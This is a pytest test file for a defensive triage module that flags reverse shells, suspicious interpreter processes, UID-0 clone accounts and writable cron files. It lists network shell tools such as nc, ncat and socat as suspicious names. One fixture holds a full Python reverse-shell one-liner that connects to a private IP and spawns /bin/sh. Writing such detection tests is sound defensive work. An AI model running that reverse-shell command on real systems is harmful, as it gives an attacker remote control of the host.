from collections import namedtuple

import pytest

from erislite.response.rapid_response import triage

Addr = namedtuple("Addr", "ip port")
Conn = namedtuple("Conn", "status laddr raddr pid")
Account = namedtuple("Account", "pw_name pw_uid pw_shell")


@pytest.mark.parametrize(
    "name",
    [
        "sshd",
        "sshd-session",
        "ssh",
        "rsync",
        "php-fpm8.2",
        "containerd-shim",
        "syncthing",
        "bashful",
    ],
)
def test_legitimate_processes_are_not_shells(name):
    assert triage.is_suspicious_process_name(name) is False


@pytest.mark.parametrize(
    "name",
    [
        "bash",
        "sh",
        "dash",
        "zsh",
        "nc",
        "ncat",
        "socat",
        "perl",
        "perl5.36",
        "php8.2",
        "ruby",
        "lua5.4",
    ],
)
def test_shells_and_interpreters_are_suspicious(name):
    assert triage.is_suspicious_process_name(name) is True


@pytest.mark.parametrize(
    "ip, internal",
    [
        ("10.1.2.3", True),
        ("172.31.0.1", True),
        ("172.32.0.1", False),
        ("192.168.1.1", True),
        ("127.0.0.1", True),
        ("::1", True),
        ("::ffff:10.0.0.1", True),
        ("fe80::1", True),
        ("203.0.113.10", True),  # TEST-NET documentation range is reserved, not global
        ("8.8.8.8", False),
        ("not-an-ip", False),
    ],
)
def test_is_internal_address(ip, internal):
    assert triage.is_internal_address(ip) is internal


def _names(mapping):
    return lambda pid: mapping.get(pid, "")


def test_inbound_ssh_session_is_not_flagged():
    connections = [
        Conn("LISTEN", Addr("0.0.0.0", 22), None, 100),
        Conn("ESTABLISHED", Addr("10.0.0.5", 22), Addr("8.8.4.4", 51515), 200),
    ]

    found = triage.classify_connections(connections, _names({100: "sshd", 200: "sshd-session"}))

    assert found == []


def test_inbound_connection_held_by_netcat_is_flagged():
    connections = [
        Conn("LISTEN", Addr("0.0.0.0", 4444), None, 300),
        Conn("ESTABLISHED", Addr("10.0.0.5", 4444), Addr("8.8.4.4", 51515), 300),
    ]

    found = triage.classify_connections(connections, _names({300: "nc"}))

    assert len(found) == 1
    assert found[0]["direction"] == "inbound"


def test_reverse_shell_on_common_port_is_flagged():
    connections = [Conn("ESTABLISHED", Addr("10.0.0.5", 40000), Addr("8.8.4.4", 443), 400)]

    found = triage.classify_connections(connections, _names({400: "bash"}))

    assert len(found) == 1
    assert found[0]["remote_ip"] == "8.8.4.4"
    assert "bash" in found[0]["reason"]


def test_outbound_to_nonstandard_port_is_flagged():
    connections = [Conn("ESTABLISHED", Addr("10.0.0.5", 40000), Addr("8.8.4.4", 8443), 500)]

    found = triage.classify_connections(connections, _names({500: "curl"}))

    assert len(found) == 1
    assert "non-standard port 8443" in found[0]["reason"]


def test_outbound_https_from_regular_process_is_not_flagged():
    connections = [Conn("ESTABLISHED", Addr("10.0.0.5", 40000), Addr("8.8.4.4", 443), 600)]

    assert triage.classify_connections(connections, _names({600: "apt"})) == []


def test_protected_operator_ip_is_never_flagged():
    connections = [Conn("ESTABLISHED", Addr("10.0.0.5", 40000), Addr("8.8.4.4", 9001), 700)]

    found = triage.classify_connections(
        connections, _names({700: "bash"}), protected_ips={"8.8.4.4"}
    )

    assert found == []


def test_flagged_users_separates_uid0_clones_from_review_accounts():
    accounts = [
        Account("root", 0, "/bin/bash"),
        Account("toor", 0, "/bin/bash"),
        Account("postgres", 115, "/bin/bash"),
        Account("www-data", 33, "/usr/sbin/nologin"),
        Account("liam", 1000, "/bin/bash"),
    ]

    contain, review, error = triage.flagged_users(accounts, uid_min=1000)

    assert contain == ["toor"]
    assert review == ["postgres"]
    assert error is None


def test_login_uid_min_reads_login_defs(tmp_path):
    defs = tmp_path / "login.defs"
    defs.write_text("# comment\nUID_MIN   500\nUID_MAX 60000\n")

    assert triage._login_uid_min(str(defs)) == 500
    assert triage._login_uid_min(str(tmp_path / "missing")) == 1000


def test_writable_crons_flags_regular_files_only(tmp_path):
    cron_dir = tmp_path / "cron.d"
    cron_dir.mkdir()

    writable = cron_dir / "writable"
    writable.write_text("x")
    writable.chmod(0o666)

    safe = cron_dir / "safe"
    safe.write_text("x")
    safe.chmod(0o644)

    (cron_dir / "link").symlink_to(safe)

    flagged, errors = triage.writable_crons([str(cron_dir)])

    assert flagged == [str(writable)]
    assert errors == []


def test_shell_connected_to_private_red_team_address_is_flagged():
    connections = [Conn("ESTABLISHED", Addr("10.0.0.5", 40000), Addr("10.10.10.66", 4444), 800)]

    found = triage.classify_connections(connections, _names({800: "sh"}))

    assert len(found) == 1
    assert found[0]["remote_ip"] == "10.10.10.66"


def test_private_nonstandard_port_from_regular_process_is_not_flagged():
    connections = [Conn("ESTABLISHED", Addr("10.0.0.5", 40000), Addr("10.0.0.9", 5432), 900)]

    assert triage.classify_connections(connections, _names({900: "python3"})) == []


def test_loopback_shell_connection_is_ignored():
    connections = [Conn("ESTABLISHED", Addr("127.0.0.1", 40000), Addr("127.0.0.1", 5000), 950)]

    assert triage.classify_connections(connections, _names({950: "bash"})) == []


def test_python_reverse_shell_on_private_ip_is_flagged():
    connections = [
        Conn(
            "ESTABLISHED",
            Addr("10.0.0.5", 49152),
            Addr("10.0.0.20", 4444),
            4242,
        )
    ]

    results = triage.classify_connections(
        connections,
        name_for_pid=lambda pid: "python3",
        cmdline_for_pid=lambda pid: (
            "python3 -c import socket,os,pty; "
            "s=socket.socket(); "
            "s.connect(('10.0.0.20',4444)); "
            "os.dup2(s.fileno(),0); "
            "pty.spawn('/bin/sh')"
        ),
    )

    assert len(results) == 1
    assert results[0]["proc"] == "python3"
    assert results[0]["remote_ip"] == "10.0.0.20"


def test_ipv4_mapped_peer_is_reported_as_ipv4():
    connections = [
        Conn("ESTABLISHED", Addr("::ffff:10.0.0.5", 40000), Addr("::ffff:8.8.4.4", 9001), 710)
    ]

    found = triage.classify_connections(connections, _names({710: "bash"}))

    assert found[0]["remote_ip"] == "8.8.4.4"


def test_protected_ip_matches_its_ipv4_mapped_form():
    connections = [
        Conn("ESTABLISHED", Addr("::ffff:10.0.0.5", 40000), Addr("::ffff:8.8.4.4", 9001), 720)
    ]

    found = triage.classify_connections(
        connections, _names({720: "bash"}), protected_ips={"8.8.4.4"}
    )

    assert found == []
